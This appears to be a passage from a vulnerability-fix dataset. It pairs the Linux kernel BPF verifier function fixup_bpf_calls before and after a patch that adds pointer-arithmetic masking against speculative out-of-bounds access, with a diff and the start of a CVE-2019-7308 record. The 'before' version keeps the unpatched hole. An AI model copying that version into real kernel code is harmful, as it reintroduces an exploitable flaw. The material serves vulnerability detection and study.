        "func_before": "static int fixup_bpf_calls(struct bpf_verifier_env *env)\n{\n\tstruct bpf_prog *prog = env->prog;\n\tstruct bpf_insn *insn = prog->insnsi;\n\tconst struct bpf_func_proto *fn;\n\tconst int insn_cnt = prog->len;\n\tconst struct bpf_map_ops *ops;\n\tstruct bpf_insn_aux_data *aux;\n\tstruct bpf_insn insn_buf[16];\n\tstruct bpf_prog *new_prog;\n\tstruct bpf_map *map_ptr;\n\tint i, cnt, delta = 0;\n\n\tfor (i = 0; i < insn_cnt; i++, insn++) {\n\t\tif (insn->code == (BPF_ALU64 | BPF_MOD | BPF_X) ||\n\t\t    insn->code == (BPF_ALU64 | BPF_DIV | BPF_X) ||\n\t\t    insn->code == (BPF_ALU | BPF_MOD | BPF_X) ||\n\t\t    insn->code == (BPF_ALU | BPF_DIV | BPF_X)) {\n\t\t\tbool is64 = BPF_CLASS(insn->code) == BPF_ALU64;\n\t\t\tstruct bpf_insn mask_and_div[] = {\n\t\t\t\tBPF_MOV32_REG(insn->src_reg, insn->src_reg),\n\t\t\t\t/* Rx div 0 -> 0 */\n\t\t\t\tBPF_JMP_IMM(BPF_JNE, insn->src_reg, 0, 2),\n\t\t\t\tBPF_ALU32_REG(BPF_XOR, insn->dst_reg, insn->dst_reg),\n\t\t\t\tBPF_JMP_IMM(BPF_JA, 0, 0, 1),\n\t\t\t\t*insn,\n\t\t\t};\n\t\t\tstruct bpf_insn mask_and_mod[] = {\n\t\t\t\tBPF_MOV32_REG(insn->src_reg, insn->src_reg),\n\t\t\t\t/* Rx mod 0 -> Rx */\n\t\t\t\tBPF_JMP_IMM(BPF_JEQ, insn->src_reg, 0, 1),\n\t\t\t\t*insn,\n\t\t\t};\n\t\t\tstruct bpf_insn *patchlet;\n\n\t\t\tif (insn->code == (BPF_ALU64 | BPF_DIV | BPF_X) ||\n\t\t\t    insn->code == (BPF_ALU | BPF_DIV | BPF_X)) {\n\t\t\t\tpatchlet = mask_and_div + (is64 ? 1 : 0);\n\t\t\t\tcnt = ARRAY_SIZE(mask_and_div) - (is64 ? 1 : 0);\n\t\t\t} else {\n\t\t\t\tpatchlet = mask_and_mod + (is64 ? 1 : 0);\n\t\t\t\tcnt = ARRAY_SIZE(mask_and_mod) - (is64 ? 1 : 0);\n\t\t\t}\n\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, patchlet, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (BPF_CLASS(insn->code) == BPF_LD &&\n\t\t    (BPF_MODE(insn->code) == BPF_ABS ||\n\t\t     BPF_MODE(insn->code) == BPF_IND)) {\n\t\t\tcnt = env->ops->gen_ld_abs(insn, insn_buf);\n\t\t\tif (cnt == 0 || cnt >= ARRAY_SIZE(insn_buf)) {\n\t\t\t\tverbose(env, \"bpf verifier is misconfigured\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (insn->code != (BPF_JMP | BPF_CALL))\n\t\t\tcontinue;\n\t\tif (insn->src_reg == BPF_PSEUDO_CALL)\n\t\t\tcontinue;\n\n\t\tif (insn->imm == BPF_FUNC_get_route_realm)\n\t\t\tprog->dst_needed = 1;\n\t\tif (insn->imm == BPF_FUNC_get_prandom_u32)\n\t\t\tbpf_user_rnd_init_once();\n\t\tif (insn->imm == BPF_FUNC_override_return)\n\t\t\tprog->kprobe_override = 1;\n\t\tif (insn->imm == BPF_FUNC_tail_call) {\n\t\t\t/* If we tail call into other programs, we\n\t\t\t * cannot make any assumptions since they can\n\t\t\t * be replaced dynamically during runtime in\n\t\t\t * the program array.\n\t\t\t */\n\t\t\tprog->cb_access = 1;\n\t\t\tenv->prog->aux->stack_depth = MAX_BPF_STACK;\n\t\t\tenv->prog->aux->max_pkt_offset = MAX_PACKET_OFF;\n\n\t\t\t/* mark bpf_tail_call as different opcode to avoid\n\t\t\t * conditional branch in the interpeter for every normal\n\t\t\t * call and to prevent accidental JITing by JIT compiler\n\t\t\t * that doesn't support bpf_tail_call yet\n\t\t\t */\n\t\t\tinsn->imm = 0;\n\t\t\tinsn->code = BPF_JMP | BPF_TAIL_CALL;\n\n\t\t\taux = &env->insn_aux_data[i + delta];\n\t\t\tif (!bpf_map_ptr_unpriv(aux))\n\t\t\t\tcontinue;\n\n\t\t\t/* instead of changing every JIT dealing with tail_call\n\t\t\t * emit two extra insns:\n\t\t\t * if (index >= max_entries) goto out;\n\t\t\t * index &= array->index_mask;\n\t\t\t * to avoid out-of-bounds cpu speculation\n\t\t\t */\n\t\t\tif (bpf_map_ptr_poisoned(aux)) {\n\t\t\t\tverbose(env, \"tail_call abusing map_ptr\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t\tmap_ptr = BPF_MAP_PTR(aux->map_state);\n\t\t\tinsn_buf[0] = BPF_JMP_IMM(BPF_JGE, BPF_REG_3,\n\t\t\t\t\t\t  map_ptr->max_entries, 2);\n\t\t\tinsn_buf[1] = BPF_ALU32_IMM(BPF_AND, BPF_REG_3,\n\t\t\t\t\t\t    container_of(map_ptr,\n\t\t\t\t\t\t\t\t struct bpf_array,\n\t\t\t\t\t\t\t\t map)->index_mask);\n\t\t\tinsn_buf[2] = *insn;\n\t\t\tcnt = 3;\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* BPF_EMIT_CALL() assumptions in some of the map_gen_lookup\n\t\t * and other inlining handlers are currently limited to 64 bit\n\t\t * only.\n\t\t */\n\t\tif (prog->jit_requested && BITS_PER_LONG == 64 &&\n\t\t    (insn->imm == BPF_FUNC_map_lookup_elem ||\n\t\t     insn->imm == BPF_FUNC_map_update_elem ||\n\t\t     insn->imm == BPF_FUNC_map_delete_elem ||\n\t\t     insn->imm == BPF_FUNC_map_push_elem   ||\n\t\t     insn->imm == BPF_FUNC_map_pop_elem    ||\n\t\t     insn->imm == BPF_FUNC_map_peek_elem)) {\n\t\t\taux = &env->insn_aux_data[i + delta];\n\t\t\tif (bpf_map_ptr_poisoned(aux))\n\t\t\t\tgoto patch_call_imm;\n\n\t\t\tmap_ptr = BPF_MAP_PTR(aux->map_state);\n\t\t\tops = map_ptr->ops;\n\t\t\tif (insn->imm == BPF_FUNC_map_lookup_elem &&\n\t\t\t    ops->map_gen_lookup) {\n\t\t\t\tcnt = ops->map_gen_lookup(map_ptr, insn_buf);\n\t\t\t\tif (cnt == 0 || cnt >= ARRAY_SIZE(insn_buf)) {\n\t\t\t\t\tverbose(env, \"bpf verifier is misconfigured\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta,\n\t\t\t\t\t\t\t       insn_buf, cnt);\n\t\t\t\tif (!new_prog)\n\t\t\t\t\treturn -ENOMEM;\n\n\t\t\t\tdelta    += cnt - 1;\n\t\t\t\tenv->prog = prog = new_prog;\n\t\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_lookup_elem,\n\t\t\t\t     (void *(*)(struct bpf_map *map, void *key))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_delete_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *key))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_update_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *key, void *value,\n\t\t\t\t\t      u64 flags))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_push_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *value,\n\t\t\t\t\t      u64 flags))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_pop_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *value))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_peek_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *value))NULL));\n\n\t\t\tswitch (insn->imm) {\n\t\t\tcase BPF_FUNC_map_lookup_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_lookup_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_update_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_update_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_delete_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_delete_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_push_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_push_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_pop_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_pop_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_peek_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_peek_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tgoto patch_call_imm;\n\t\t}\n\npatch_call_imm:\n\t\tfn = env->ops->get_func_proto(insn->imm, env->prog);\n\t\t/* all functions that have prototype and verifier allowed\n\t\t * programs to call them, must be real in-kernel functions\n\t\t */\n\t\tif (!fn->func) {\n\t\t\tverbose(env,\n\t\t\t\t\"kernel subsystem misconfigured func %s#%d\\n\",\n\t\t\t\tfunc_id_name(insn->imm), insn->imm);\n\t\t\treturn -EFAULT;\n\t\t}\n\t\tinsn->imm = fn->func - __bpf_call_base;\n\t}\n\n\treturn 0;\n}",
        "func": "static int fixup_bpf_calls(struct bpf_verifier_env *env)\n{\n\tstruct bpf_prog *prog = env->prog;\n\tstruct bpf_insn *insn = prog->insnsi;\n\tconst struct bpf_func_proto *fn;\n\tconst int insn_cnt = prog->len;\n\tconst struct bpf_map_ops *ops;\n\tstruct bpf_insn_aux_data *aux;\n\tstruct bpf_insn insn_buf[16];\n\tstruct bpf_prog *new_prog;\n\tstruct bpf_map *map_ptr;\n\tint i, cnt, delta = 0;\n\n\tfor (i = 0; i < insn_cnt; i++, insn++) {\n\t\tif (insn->code == (BPF_ALU64 | BPF_MOD | BPF_X) ||\n\t\t    insn->code == (BPF_ALU64 | BPF_DIV | BPF_X) ||\n\t\t    insn->code == (BPF_ALU | BPF_MOD | BPF_X) ||\n\t\t    insn->code == (BPF_ALU | BPF_DIV | BPF_X)) {\n\t\t\tbool is64 = BPF_CLASS(insn->code) == BPF_ALU64;\n\t\t\tstruct bpf_insn mask_and_div[] = {\n\t\t\t\tBPF_MOV32_REG(insn->src_reg, insn->src_reg),\n\t\t\t\t/* Rx div 0 -> 0 */\n\t\t\t\tBPF_JMP_IMM(BPF_JNE, insn->src_reg, 0, 2),\n\t\t\t\tBPF_ALU32_REG(BPF_XOR, insn->dst_reg, insn->dst_reg),\n\t\t\t\tBPF_JMP_IMM(BPF_JA, 0, 0, 1),\n\t\t\t\t*insn,\n\t\t\t};\n\t\t\tstruct bpf_insn mask_and_mod[] = {\n\t\t\t\tBPF_MOV32_REG(insn->src_reg, insn->src_reg),\n\t\t\t\t/* Rx mod 0 -> Rx */\n\t\t\t\tBPF_JMP_IMM(BPF_JEQ, insn->src_reg, 0, 1),\n\t\t\t\t*insn,\n\t\t\t};\n\t\t\tstruct bpf_insn *patchlet;\n\n\t\t\tif (insn->code == (BPF_ALU64 | BPF_DIV | BPF_X) ||\n\t\t\t    insn->code == (BPF_ALU | BPF_DIV | BPF_X)) {\n\t\t\t\tpatchlet = mask_and_div + (is64 ? 1 : 0);\n\t\t\t\tcnt = ARRAY_SIZE(mask_and_div) - (is64 ? 1 : 0);\n\t\t\t} else {\n\t\t\t\tpatchlet = mask_and_mod + (is64 ? 1 : 0);\n\t\t\t\tcnt = ARRAY_SIZE(mask_and_mod) - (is64 ? 1 : 0);\n\t\t\t}\n\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, patchlet, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (BPF_CLASS(insn->code) == BPF_LD &&\n\t\t    (BPF_MODE(insn->code) == BPF_ABS ||\n\t\t     BPF_MODE(insn->code) == BPF_IND)) {\n\t\t\tcnt = env->ops->gen_ld_abs(insn, insn_buf);\n\t\t\tif (cnt == 0 || cnt >= ARRAY_SIZE(insn_buf)) {\n\t\t\t\tverbose(env, \"bpf verifier is misconfigured\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (insn->code == (BPF_ALU64 | BPF_ADD | BPF_X) ||\n\t\t    insn->code == (BPF_ALU64 | BPF_SUB | BPF_X)) {\n\t\t\tconst u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;\n\t\t\tconst u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;\n\t\t\tstruct bpf_insn insn_buf[16];\n\t\t\tstruct bpf_insn *patch = &insn_buf[0];\n\t\t\tbool issrc, isneg;\n\t\t\tu32 off_reg;\n\n\t\t\taux = &env->insn_aux_data[i + delta];\n\t\t\tif (!aux->alu_state)\n\t\t\t\tcontinue;\n\n\t\t\tisneg = aux->alu_state & BPF_ALU_NEG_VALUE;\n\t\t\tissrc = (aux->alu_state & BPF_ALU_SANITIZE) ==\n\t\t\t\tBPF_ALU_SANITIZE_SRC;\n\n\t\t\toff_reg = issrc ? insn->src_reg : insn->dst_reg;\n\t\t\tif (isneg)\n\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);\n\t\t\t*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);\n\t\t\t*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);\n\t\t\t*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);\n\t\t\t*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);\n\t\t\t*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);\n\t\t\tif (issrc) {\n\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,\n\t\t\t\t\t\t\t off_reg);\n\t\t\t\tinsn->src_reg = BPF_REG_AX;\n\t\t\t} else {\n\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,\n\t\t\t\t\t\t\t BPF_REG_AX);\n\t\t\t}\n\t\t\tif (isneg)\n\t\t\t\tinsn->code = insn->code == code_add ?\n\t\t\t\t\t     code_sub : code_add;\n\t\t\t*patch++ = *insn;\n\t\t\tif (issrc && isneg)\n\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);\n\t\t\tcnt = patch - insn_buf;\n\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (insn->code != (BPF_JMP | BPF_CALL))\n\t\t\tcontinue;\n\t\tif (insn->src_reg == BPF_PSEUDO_CALL)\n\t\t\tcontinue;\n\n\t\tif (insn->imm == BPF_FUNC_get_route_realm)\n\t\t\tprog->dst_needed = 1;\n\t\tif (insn->imm == BPF_FUNC_get_prandom_u32)\n\t\t\tbpf_user_rnd_init_once();\n\t\tif (insn->imm == BPF_FUNC_override_return)\n\t\t\tprog->kprobe_override = 1;\n\t\tif (insn->imm == BPF_FUNC_tail_call) {\n\t\t\t/* If we tail call into other programs, we\n\t\t\t * cannot make any assumptions since they can\n\t\t\t * be replaced dynamically during runtime in\n\t\t\t * the program array.\n\t\t\t */\n\t\t\tprog->cb_access = 1;\n\t\t\tenv->prog->aux->stack_depth = MAX_BPF_STACK;\n\t\t\tenv->prog->aux->max_pkt_offset = MAX_PACKET_OFF;\n\n\t\t\t/* mark bpf_tail_call as different opcode to avoid\n\t\t\t * conditional branch in the interpeter for every normal\n\t\t\t * call and to prevent accidental JITing by JIT compiler\n\t\t\t * that doesn't support bpf_tail_call yet\n\t\t\t */\n\t\t\tinsn->imm = 0;\n\t\t\tinsn->code = BPF_JMP | BPF_TAIL_CALL;\n\n\t\t\taux = &env->insn_aux_data[i + delta];\n\t\t\tif (!bpf_map_ptr_unpriv(aux))\n\t\t\t\tcontinue;\n\n\t\t\t/* instead of changing every JIT dealing with tail_call\n\t\t\t * emit two extra insns:\n\t\t\t * if (index >= max_entries) goto out;\n\t\t\t * index &= array->index_mask;\n\t\t\t * to avoid out-of-bounds cpu speculation\n\t\t\t */\n\t\t\tif (bpf_map_ptr_poisoned(aux)) {\n\t\t\t\tverbose(env, \"tail_call abusing map_ptr\\n\");\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\n\t\t\tmap_ptr = BPF_MAP_PTR(aux->map_state);\n\t\t\tinsn_buf[0] = BPF_JMP_IMM(BPF_JGE, BPF_REG_3,\n\t\t\t\t\t\t  map_ptr->max_entries, 2);\n\t\t\tinsn_buf[1] = BPF_ALU32_IMM(BPF_AND, BPF_REG_3,\n\t\t\t\t\t\t    container_of(map_ptr,\n\t\t\t\t\t\t\t\t struct bpf_array,\n\t\t\t\t\t\t\t\t map)->index_mask);\n\t\t\tinsn_buf[2] = *insn;\n\t\t\tcnt = 3;\n\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n\t\t\tif (!new_prog)\n\t\t\t\treturn -ENOMEM;\n\n\t\t\tdelta    += cnt - 1;\n\t\t\tenv->prog = prog = new_prog;\n\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* BPF_EMIT_CALL() assumptions in some of the map_gen_lookup\n\t\t * and other inlining handlers are currently limited to 64 bit\n\t\t * only.\n\t\t */\n\t\tif (prog->jit_requested && BITS_PER_LONG == 64 &&\n\t\t    (insn->imm == BPF_FUNC_map_lookup_elem ||\n\t\t     insn->imm == BPF_FUNC_map_update_elem ||\n\t\t     insn->imm == BPF_FUNC_map_delete_elem ||\n\t\t     insn->imm == BPF_FUNC_map_push_elem   ||\n\t\t     insn->imm == BPF_FUNC_map_pop_elem    ||\n\t\t     insn->imm == BPF_FUNC_map_peek_elem)) {\n\t\t\taux = &env->insn_aux_data[i + delta];\n\t\t\tif (bpf_map_ptr_poisoned(aux))\n\t\t\t\tgoto patch_call_imm;\n\n\t\t\tmap_ptr = BPF_MAP_PTR(aux->map_state);\n\t\t\tops = map_ptr->ops;\n\t\t\tif (insn->imm == BPF_FUNC_map_lookup_elem &&\n\t\t\t    ops->map_gen_lookup) {\n\t\t\t\tcnt = ops->map_gen_lookup(map_ptr, insn_buf);\n\t\t\t\tif (cnt == 0 || cnt >= ARRAY_SIZE(insn_buf)) {\n\t\t\t\t\tverbose(env, \"bpf verifier is misconfigured\\n\");\n\t\t\t\t\treturn -EINVAL;\n\t\t\t\t}\n\n\t\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta,\n\t\t\t\t\t\t\t       insn_buf, cnt);\n\t\t\t\tif (!new_prog)\n\t\t\t\t\treturn -ENOMEM;\n\n\t\t\t\tdelta    += cnt - 1;\n\t\t\t\tenv->prog = prog = new_prog;\n\t\t\t\tinsn      = new_prog->insnsi + i + delta;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_lookup_elem,\n\t\t\t\t     (void *(*)(struct bpf_map *map, void *key))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_delete_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *key))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_update_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *key, void *value,\n\t\t\t\t\t      u64 flags))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_push_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *value,\n\t\t\t\t\t      u64 flags))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_pop_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *value))NULL));\n\t\t\tBUILD_BUG_ON(!__same_type(ops->map_peek_elem,\n\t\t\t\t     (int (*)(struct bpf_map *map, void *value))NULL));\n\n\t\t\tswitch (insn->imm) {\n\t\t\tcase BPF_FUNC_map_lookup_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_lookup_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_update_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_update_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_delete_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_delete_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_push_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_push_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_pop_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_pop_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\tcase BPF_FUNC_map_peek_elem:\n\t\t\t\tinsn->imm = BPF_CAST_CALL(ops->map_peek_elem) -\n\t\t\t\t\t    __bpf_call_base;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tgoto patch_call_imm;\n\t\t}\n\npatch_call_imm:\n\t\tfn = env->ops->get_func_proto(insn->imm, env->prog);\n\t\t/* all functions that have prototype and verifier allowed\n\t\t * programs to call them, must be real in-kernel functions\n\t\t */\n\t\tif (!fn->func) {\n\t\t\tverbose(env,\n\t\t\t\t\"kernel subsystem misconfigured func %s#%d\\n\",\n\t\t\t\tfunc_id_name(insn->imm), insn->imm);\n\t\t\treturn -EFAULT;\n\t\t}\n\t\tinsn->imm = fn->func - __bpf_call_base;\n\t}\n\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -71,6 +71,57 @@\n \t\t\tcontinue;\n \t\t}\n \n+\t\tif (insn->code == (BPF_ALU64 | BPF_ADD | BPF_X) ||\n+\t\t    insn->code == (BPF_ALU64 | BPF_SUB | BPF_X)) {\n+\t\t\tconst u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;\n+\t\t\tconst u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;\n+\t\t\tstruct bpf_insn insn_buf[16];\n+\t\t\tstruct bpf_insn *patch = &insn_buf[0];\n+\t\t\tbool issrc, isneg;\n+\t\t\tu32 off_reg;\n+\n+\t\t\taux = &env->insn_aux_data[i + delta];\n+\t\t\tif (!aux->alu_state)\n+\t\t\t\tcontinue;\n+\n+\t\t\tisneg = aux->alu_state & BPF_ALU_NEG_VALUE;\n+\t\t\tissrc = (aux->alu_state & BPF_ALU_SANITIZE) ==\n+\t\t\t\tBPF_ALU_SANITIZE_SRC;\n+\n+\t\t\toff_reg = issrc ? insn->src_reg : insn->dst_reg;\n+\t\t\tif (isneg)\n+\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);\n+\t\t\t*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);\n+\t\t\t*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);\n+\t\t\t*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);\n+\t\t\t*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);\n+\t\t\t*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);\n+\t\t\tif (issrc) {\n+\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,\n+\t\t\t\t\t\t\t off_reg);\n+\t\t\t\tinsn->src_reg = BPF_REG_AX;\n+\t\t\t} else {\n+\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,\n+\t\t\t\t\t\t\t BPF_REG_AX);\n+\t\t\t}\n+\t\t\tif (isneg)\n+\t\t\t\tinsn->code = insn->code == code_add ?\n+\t\t\t\t\t     code_sub : code_add;\n+\t\t\t*patch++ = *insn;\n+\t\t\tif (issrc && isneg)\n+\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);\n+\t\t\tcnt = patch - insn_buf;\n+\n+\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n+\t\t\tif (!new_prog)\n+\t\t\t\treturn -ENOMEM;\n+\n+\t\t\tdelta    += cnt - 1;\n+\t\t\tenv->prog = prog = new_prog;\n+\t\t\tinsn      = new_prog->insnsi + i + delta;\n+\t\t\tcontinue;\n+\t\t}\n+\n \t\tif (insn->code != (BPF_JMP | BPF_CALL))\n \t\t\tcontinue;\n \t\tif (insn->src_reg == BPF_PSEUDO_CALL)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\tif (insn->code == (BPF_ALU64 | BPF_ADD | BPF_X) ||",
                "\t\t    insn->code == (BPF_ALU64 | BPF_SUB | BPF_X)) {",
                "\t\t\tconst u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;",
                "\t\t\tconst u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;",
                "\t\t\tstruct bpf_insn insn_buf[16];",
                "\t\t\tstruct bpf_insn *patch = &insn_buf[0];",
                "\t\t\tbool issrc, isneg;",
                "\t\t\tu32 off_reg;",
                "",
                "\t\t\taux = &env->insn_aux_data[i + delta];",
                "\t\t\tif (!aux->alu_state)",
                "\t\t\t\tcontinue;",
                "",
                "\t\t\tisneg = aux->alu_state & BPF_ALU_NEG_VALUE;",
                "\t\t\tissrc = (aux->alu_state & BPF_ALU_SANITIZE) ==",
                "\t\t\t\tBPF_ALU_SANITIZE_SRC;",
                "",
                "\t\t\toff_reg = issrc ? insn->src_reg : insn->dst_reg;",
                "\t\t\tif (isneg)",
                "\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);",
                "\t\t\t*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);",
                "\t\t\t*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);",
                "\t\t\t*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);",
                "\t\t\t*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);",
                "\t\t\t*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);",
                "\t\t\tif (issrc) {",
                "\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,",
                "\t\t\t\t\t\t\t off_reg);",
                "\t\t\t\tinsn->src_reg = BPF_REG_AX;",
                "\t\t\t} else {",
                "\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,",
                "\t\t\t\t\t\t\t BPF_REG_AX);",
                "\t\t\t}",
                "\t\t\tif (isneg)",
                "\t\t\t\tinsn->code = insn->code == code_add ?",
                "\t\t\t\t\t     code_sub : code_add;",
                "\t\t\t*patch++ = *insn;",
                "\t\t\tif (issrc && isneg)",
                "\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);",
                "\t\t\tcnt = patch - insn_buf;",
                "",
                "\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);",
                "\t\t\tif (!new_prog)",
                "\t\t\t\treturn -ENOMEM;",
                "",
                "\t\t\tdelta    += cnt - 1;",
                "\t\t\tenv->prog = prog = new_prog;",
                "\t\t\tinsn      = new_prog->insnsi + i + delta;",
                "\t\t\tcontinue;",
                "\t\t}",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/do_check",
